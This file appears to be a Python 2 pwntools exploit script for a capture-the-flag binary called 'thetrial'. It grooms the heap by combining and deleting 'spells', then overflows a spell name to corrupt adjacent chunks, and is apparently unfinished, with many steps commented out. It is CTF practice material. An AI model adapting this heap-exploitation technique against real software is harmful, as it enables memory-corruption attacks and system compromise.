#!/bin/python2
# exploit thetrial
# by N4T_20

from pwn import *
from time import sleep

local = True
debug = True

if local:
    if debug:
        p = gdb.debug('./thetrial', '''
            break *0x400d9b
            continue
            ''')
        # 0x400a1a: after get a free index
        # 0x400d9b: cast spell
    else:
        p = process('./thetrial')
else:
    p = remote('localhost', 5000)

def combine_spells(index1, index2):
    p.send("2\n")
    p.recvuntil("> ")
    p.send(str(index1) + "\n")
    p.recvuntil("> ")
    p.send(str(index2) + "\n")
    p.recvuntil("> ")

def delete_spell(index):
    p.send("3\n")
    p.recvuntil("> ")
    p.send(str(index) + "\n")
    p.recvuntil("> ")

def edit_spell(index, name):
    p.send("4\n")
    p.recvuntil("> ")
    p.send(str(index) + "\n")
    p.recvuntil("New name: ")
    p.send(name) # no newline
    p.recvuntil("> ")

p.recvuntil("> ")
# Want: 16 Mordenkainens in length for name. That gives me 0x220.
def allocate_0x220():
    combine_spells(15,15) # index 16: 68
    combine_spells(17,17) # index 18: 136
    combine_spells(18,18) # index 19: 272 = 0x110
    combine_spells(19,19) # index 20: 0x220




allocate_0x220()
combine_spells(8,8) # index 21: 24 characters


for i in range(10):
    combine_spells(20, 6) # 0x227 11) # indices 22-31: 0x236 # 0x227

for i in range(6): # 8
    delete_spell(22+i)

#p.interactive()
delete_spell(0)
delete_spell(1)
delete_spell(2)
delete_spell(3)
#p.interactive()
delete_spell(4)
delete_spell(5)
delete_spell(6)
delete_spell(7)
delete_spell(9)
#delete_spell(10)
delete_spell(11)
delete_spell(12)
#p.interactive()
combine_spells(20, 21) # index 0 # 5, 0x238 # So instead of 9, I want 24...
combine_spells(20, 10) # index 1 # 6, 0x229 # Chunk to be freed
combine_spells(20, 10) # index 2 # 6, 0x229 # Chunk to be freed
combine_spells(20, 10) # index 3 # 6, 0x229 # Chunk to be freed
combine_spells(20, 10) # index 4 # 6, 0x229 # Chunk to be freed
combine_spells(20, 10) # index 5 # 6, 0x229 # Chunk to be freed
combine_spells(20, 10) # index 6 # 6, 0x229 # Chunk to be freed
combine_spells(20, 10) # index 7 # 6, 0x229 # Chunk to be freed
combine_spells(20, 21) # index 9 # 6, 0x238 # Chunk to be freed. 
combine_spells(20, 10) # index 11 # 6, 0x229 # Chunk to be freed Index 11 points to +0x5190. It's 0x240 in length. Shrink to 0x200. 
combine_spells(18, 18) # index 12, 0x110. 0x120 gets malloced.

delete_spell(0)
delete_spell(1)
delete_spell(2)
delete_spell(3)
delete_spell(4)
delete_spell(5)
delete_spell(11)
edit_spell(9, "A"*0x238) # add 0x5190 to get to the chunk

combine_spells(18, 18) # 0x110 
combine_spells(18, 18) # 0x110
combine_spells(18, 18) # 0x110
combine_spells(18, 18) # 0x110
combine_spells(18, 18) # 0x110
combine_spells(18, 18) # 0x110
combine_spells(18, 18) # 0x110
combine_spells(18, 18) # 0x110
combine_spells(18, 18) # 0x110
combine_spells(18, 18) # 0x110
combine_spells(18, 18) # 0x110
combine_spells(18, 18) # 0x110
#combine_spells(17, 17) # 0x88

#delete_spell(7)
#delete_spell(9)
#delete_spell(1) # should have a free chunk of size 0x229 --> 0x230
#edit_spell(5, "A"*0x238)
#delete_spell(21)
#sleep(20)
#edit_spell(20, "A"*0x220)

p.interactive()
